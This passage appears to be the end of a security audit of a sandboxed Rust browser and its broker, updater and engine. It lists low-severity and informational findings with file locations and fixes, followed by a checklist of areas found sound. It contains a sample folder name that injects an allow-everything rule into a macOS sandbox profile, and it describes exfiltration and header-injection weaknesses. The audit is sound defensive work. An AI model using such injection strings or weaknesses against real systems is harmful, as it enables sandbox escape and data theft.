  - `let mut control = [0_u8; CONTROL_BYTES]` has alignment 1. `CMSG_FIRSTHDR` casts it to `*mut cmsghdr` (alignment 8 on Linux, 4 on macOS), and lines 64–69, 114–115 and libc's `CMSG_NXTHDR` dereference the fields.
  - It works on x86-64 and arm64 today, but the compiler may assume alignment.
  - Fix: `#[repr(C, align(8))] struct Control([u8; CONTROL_BYTES]);`, or a `[libc::cmsghdr; N]`-backed buffer. Add `const _: () = assert!(CONTROL_BYTES >= CMSG_SPACE(2 * 4))`; it can be const on Linux.
- **L2. `confine/src/unix.rs:114–132`: macOS receive.**
  - (a) The descriptor loop's `length` comes from `cmsg_len` and is not clamped to `msg_controllen`. On truncation XNU copies the header with its original `cmsg_len` (sets `MSG_CTRUNC`, truncates the data), so the loop reads past `control` and wraps stack garbage as `OwnedFd`. They are then closed on the error path, closing unrelated core descriptors.
  - (b) XNU installs every passed descriptor before truncating, so the overflow leaks into the core's table.
  - (c) There is no `MSG_CMSG_CLOEXEC`, the `fcntl(FD_CLOEXEC)` result is unchecked, and a descriptor is inheritable between the receive and the `fcntl`.
  - Only the trusted broker sends, so this is defence in depth.
  - Fix: clamp to `control.as_ptr() + msg_controllen - data`, check `MSG_CTRUNC` before wrapping anything, and check `fcntl`.
- **L3. `confine/src/windows.rs:267–277` `environment_block`: an empty environment is one NUL.**
  - `CreateProcess` scans for two consecutive NULs, so it reads past the `Vec` into the broker's heap and copies that into the child's environment.
  - It is reachable in the crate's own test (`a_helper_whose_container_cannot_be_made_is_not_started`, `environment: &[]`), not in production, which always has `SYSTEMROOT` and the rest.
  - Fix: `if environment.is_empty() { block.push(0) }` before the final push, as std does.
- **L4. `confine/src/windows.rs:405`: the attribute list's storage is `Vec<u8>` (alignment 1).**
  - `PROC_THREAD_ATTRIBUTE_LIST` holds pointers and DWORDs; Microsoft's samples use `HeapAlloc` (16-byte aligned).
  - Fix: `Vec<u64>` sized `size.div_ceil(8)`.
- **L5. Linux helpers can `kill()` any of the user's processes.**
  - Landlock 5 has no signal scoping (ABI 6's `LANDLOCK_SCOPE_SIGNAL`), and `kill`, `tkill` and `tgkill` are allowed. Same kuid even inside the user namespace.
  - A compromised decoder can SIGSTOP the broker or SIGKILL the user's editor.
  - Fix: require Landlock 6 (Linux 6.12) with signal and abstract-socket scoping, or document it.
- **L6. `confine/src/macos.rs:28–29, 126, 134, 140`: SBPL injection.**
  - The program path, settings and staging folders, and home are interpolated into `"…"` without escaping `"` or `\`.
  - A bundle moved to a folder named `x")(allow default)("` gets an unconfined profile. Low, since it needs the user's own write access to rename it, but it is silent.
  - Fix: pass paths with `sandbox-exec -D NAME=value` and `(param "NAME")`, or refuse paths containing `"` or `\`.
- **L7. `confine/src/broker.rs:886–889` `OpenWeb`: the broker opens any http(s) address the core names, with no confirmation of its own.**
  - The user's confirmation lives in the core, so a compromised core can open attacker pages in the user's real browser (with its cookies) and has an exfiltration channel (H3).
  - Fix (owner): a confirmation dialog owned by the broker, or a rate limit plus a notice the broker shows.
- **L8. macOS interface profile (`confine/src/macos.rs:42–45, 73–93`).**
  - It may read `/private/var/folders`, where every app's per-user temporary files and caches live, and the metadata of every path.
  - It reaches `launchservicesd`, so it may be able to `LSOpenCFURLRef("https://…")` to the default browser, which would be a network-equivalent channel. Verify from a probe.
  - It reads the pasteboard at any time.
  - Fix: narrow the reads to `DARWIN_USER_CACHE_DIR` and `DARWIN_USER_TEMP_DIR` of this program, measured as before.
- **L9. Linux interface and sound helper read `/tmp`, `/run`, `$XDG_RUNTIME_DIR`, `/proc` and `/sys` in full (`linux.rs:36, 44`).** Other programs' files in `/tmp` and `/run/user/$UID` are readable. This is subsumed by the mount-namespace fix in H1.
- **L10. TLS before the peer-address check (slice (b); 567e454, `fetcher/src/transport.rs:183–219`).**
  - A name that resolves or rebinds to loopback or the LAN receives a ClientHello with an attacker-chosen SNI before the engine refuses the peer.
  - Fix: check the resolved address in `reach()` before connecting.
- **L11. `core/src/cookie_control.rs:117–119` → `cookies.rs:256–261` (slice (b); 322606e).**
  - Any fetcher can learn whether any host was reached securely, across channels and the private jar.
  - Fix: answer only for the asking channel's host and jar.
- **L12. `fetcher/src/transport.rs:167–180, 375–382` (slice (b); 00a3416).**
  - The connect timeout is per read, not for the whole open, and `close()` cannot cancel an open in progress, so a slow server or proxy piles up threads and sockets.
  - Fix: one deadline for the whole open, and cancel on close.
- **L13. `core/src/main.rs:1834`: the phone keyboard always gets `local_network = true`.**
  - On Windows that is the private-network capability. `NEOTELETEXT_QRKEYBOARD_RELAY` is honoured in release builds, `http://` included.
  - Fix: honour it only in debug builds, and only then grant local access.
- **L14. Engine `crates/neoteletext-core/src/policy.rs:34` `ipv6_blocked` (slice (b)).**
  - NAT64 `64:ff9b::/96` and `64:ff9b:1::/48` with a private IPv4 address inside, `fec0::/10` and `::a.b.c.d` are not blocked.
  - Fix: apply the IPv4 rule to embedded addresses.
- **L15. Slice (a) findings on the interface boundary.**
  - (i) `core/src/main.rs:993`: the `Opened(Some(key))` page intent on a start-page bookmark navigates the tab (requirement 4.5; e85b712).
  - (ii) `core/src/main.rs:1116–1127` `opened`: does not filter the key to the active channel, so `PageControl` reaches another tab's decoder.
  - (iii) `core/src/links.rs:714` `Asking`: global, not bound to a window or tab. After `From(B)`, a `Confirm` raised in window A sends B's tab (b2fa034). Fix: store the window and tab, and clear on a window change.
  - (iv) `core/src/main.rs:1753–1756`: turning off update checks is silent (6cb9619).
- **L16. `launcher/src/unix.rs:118–125` `install_linux`: accepts, then copies.** The copy is not checked again. Fix: copy first, accept the copy.
- **L17. `confine/src/windows.rs:540–585` `grant_to` (verify).**
  - `SetNamedSecurityInfoW` is re-applied to the core's settings folder at every start and propagates the inheritable ACE to existing children.
  - Check in the VM that propagation does not follow a junction the core's container made inside its folder. Windows' sandbox mount-point rule should confine the target to folders the container can write.
  - Safer: grant once at install, or use `SetSecurityInfo` on a handle with no propagation.
- **L18. Engine qrkeyboard (slice (c); c789bd2).**
  - "Phone connected" is reported on the first salt frame, before any frame authenticates.
  - `constant_time_equal` (`crypto.rs:151–153`) is an OR-fold the compiler does not promise to keep constant time; `subtle` is already in the lockfile.
- **L19. Tools are pinned by version, not by hash** (`scripts/tools.sh`).
- **L20. `scripts/release/build-linux.sh`:** `curl | sh` for rustup, `dnf` unpinned, no clean-tree check (nor in `build-windows.ps1`), and it cannot fetch the `file://` engine inside the container.

### Info

- **I1. Engine DBSC (not compiled into the browser).** From slice (c):
  - header injection through a session identifier with CR or LF (`dbsc.rs:431–435`, `agent/bound.rs:141`);
  - unbounded key creation and deletion from repeated registrations (`bound.rs:217–229, 316–335`);
  - no public-suffix check for `include_site`.
  - Fix before any port enables `dbsc`.
- **I2. Engine cookie jar not partitioned by folder (`crates/neoteletext-web`, 64c1a97).** This is real for other ports of the engine. **The browser is not affected:** its core gives each channel (scheme, host, port, folder) its own jar tag (`core/src/cookies.rs:187–196`), refuses requests outside the channel's folder (`owns`, 107–108; `header_for`, 204–217), and stores within the folder (`store`, 225–238). I checked this against slice (c)'s report, which had rated it High for the browser. A nested channel (`/a/b/`) does receive its parent `/a/`'s cookies, as path cookies do on the web.
- **I3. Lints on a git dependency are capped.** Cargo builds the engine with `--cap-lints allow`, so its `#![forbid(unsafe_code)]` is enforced only by the engine's own gate. Consider a browser gate step that greps the pinned engine source for `unsafe`.
- **I4. `confine/src/macos.rs:10–12`** still says "The trusted core itself is not confined", which decision 56 made untrue.
- **I5. Stale project notes.**
  - The project `CLAUDE.md` still names only `dock-menu` and `web-opener` as allowed `unsafe`; requirement 10.12 now also allows `confine` and `os-install`.
  - Requirement 10.12's Verification lists only `confine`'s `linux.rs`, `unix.rs` and `windows.rs`, and `os-install` is in its amendment. Neither matches the module-wide Clippy allow (I9).
- **I6. Generated source with unescaped paths.** `installer/build.rs` and `release-identity/build.rs` write `include_bytes!(r"{path}")`; a payload or identity path containing `"` would inject Rust into the build (build-time input only).
- **I7. Engine `descriptor.rs:423–432`:** a service descriptor's `push.input: true` may send typed keys to a WebSocket on another origin.
- **I8. Updater proxy handshake.** `tuf/updater/src/transport.rs` (around line 97, `proxy.open_tunnel`) discards bytes that arrive with the proxy's answer (engine 953b0a8 now returns them). This is a functional failure that fails closed.
- **I9.** The module-wide `allow(clippy::undocumented_unsafe_blocks)` in `confine/src/windows.rs:32–35` and `os-install/src/windows.rs:7–10` (above).
- **I10.** Two AEAD and HMAC stacks in the browser binary (ring through rustls; RustCrypto `aes-gcm` 0.10, `hmac` and `hkdf` 0.12 and 0.13).
- **I11.** The engine pin is a git SHA-1 commit id; collisions are theoretical, but a SHA-256 git repository or a vendored tarball hash would remove the question.
- **I12.** dock-menu's sender assumption (above).
- **I13. Slice (a) other notes.**
  - The bookmark import reveals whether a file exists and its size class; limit it to `.html`, `.htm` and `.txt`, with a fixed message.
  - `TabToWindow` moves tabs between private and ordinary windows.
  - Browser-wide Log lines (main.rs:998, 2029) disclose private-tab activity.
  - `start_bookmark_reader` (main.rs:204–232) has no deadline.
  - The hostile-interface harness (6554b45) runs without a broker, a start-page tab, bookmarks, several windows or private tabs. `channels()` reads only the current window, and it checks no hand-offs, bookmarks or decoder Views.

---

## Checked and found sound (not repeated above)

- **Broker protocol (`confine/src/broker.rs`):**
  - The core names a program code, never a path or role. The role comes from the program (`Program::role`).
  - Text is ≤ 4096 bytes and valid UTF-8; there are at most 64 arguments; requests are capped at about 262 KB before allocation, and anything malformed ends the core.
  - The updater's port and staging come from the broker's rules (`core/src/updates.rs:74–84`).
  - `MAX_HELPERS` is 512.
  - Helpers' pipe copies are closed after `SCM_RIGHTS` or `DuplicateHandle`.
  - The core cannot write the launcher's `healthy` line itself, because its standard output is null.
- **Environments:** `env_clear` plus an allow-list per role (`confine/src/lib.rs:226–298`).
- **Windows containers:** the decoder and core are less privileged containers with the Win32k filter; the fetcher has `internetClient` (plus `privateNetworkClientServer` only when allowed); the sound helper has no capabilities. Every helper is in a job with one process, kill-on-close and UI limits, and has the mitigation policies, no child processes and a handle list.
- **macOS profiles:** `(deny default)`; network only for the fetcher and keyboard (`*:*`) and the updater (one port); writes only for the core's and updater's folders.
- **Updates:**
  - The core-to-updater wire is bounded (512-byte payloads, strict fields; `update/src/wire.rs`).
  - The manifest path allow-list, `MAX_FILES` and lengths are checked; partial downloads are checked by hash.
  - TUF metadata is pinned to the built-in root with rollback protection in the datastore.
  - The Windows `copy_in` re-check and the launcher release's Authenticode check before switching (`launcher/src/windows.rs:39–60`).
- **Interface boundary (slice (a)):**
  - Frame bounds before allocation, text cleaning, tab and window index checks, and per-channel window routing.
  - The certificate-error screen: a 1-byte code, the core's own wording, no "proceed".
  - Menu bar and field clipboard (04d1612): no protocol change; paste is cleaned and bounded; the terminal paste uses the existing Input path filtered to the active channel.
  - Fastext, settings through `checked_change`, the cookie panel without values, console bounds, and the bookmark-import parser in a confined decoder.
- **Network boundary (slice (b)):**
  - Fetcher and decoder messages are fully bounded, and a message's tab comes from the reader thread, never from the message.
  - Cookie scoping (apart from L11).
  - rustls with the default verifier and TLS 1.2 or 1.3 only.
  - A proxy failure never falls back to a direct connection.
  - The address actually connected to is checked when there is no proxy.
  - Push is limited to the same origin.
  - Typing goes only to the active open page; NFC normalisation and paste limits.
  - The phone keyboard's text cleaning and rate limit.
- **Engine to the pin (slice (c)):**
  - Proxy CONNECT and SOCKS5 parsing, bounded with no header injection.
  - Cookies: `Clear-Site-Data` only over HTTPS; saved-cookie import bounded.
  - qrkeyboard AES-GCM: counter nonces that never repeat, separate keys per direction, in-order acceptance after authentication; SPAKE2 per RFC 9382; PIN lockout after 5 attempts.
  - Input: mode stack depth 16, control bodies ≤ 1 fragment.
  - Formats: `web:` targets checked; Log lines bounded and cleaned.
  - Audio: no allocation, saturating offsets.
  - No `unsafe` code.
